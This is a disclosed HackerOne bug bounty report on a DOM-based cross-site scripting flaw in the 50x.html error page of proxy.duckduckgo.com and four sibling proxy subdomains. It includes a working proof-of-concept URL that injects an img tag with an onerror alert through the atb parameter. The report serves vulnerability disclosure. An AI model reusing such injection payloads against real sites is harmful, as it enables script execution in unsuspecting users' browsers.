# DOM XSS on 50x.html page on proxy.duckduckgo.com

## Report Details
- **Report ID**: 426275
- **URL**: https://hackerone.com/reports/426275
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-10-20T20:41:31.759Z
- **Disclosed**: 2018-11-07T15:44:46.150Z

## Reporter
- **Username**: smither
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: duckduckgo

## Vulnerability Information
Hi,

I read the report about DOM XSS on 50x.html page (https://hackerone.com/reports/405191).
I decided to check some other subdomains to be sure.
This link still executes javascript:
https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E

The following subdomains execute javascript as well:
proxy1.duckduckgo.com
proxy2.duckduckgo.com
proxy3.duckduckgo.com
proxy4.duckduckgo.com

@cujanovic: I'm sorry for stealing.

## Impact

The attacker can execute javascript code.

## Attachments
- Screenshot_from_2018-10-21_09-34-26.png
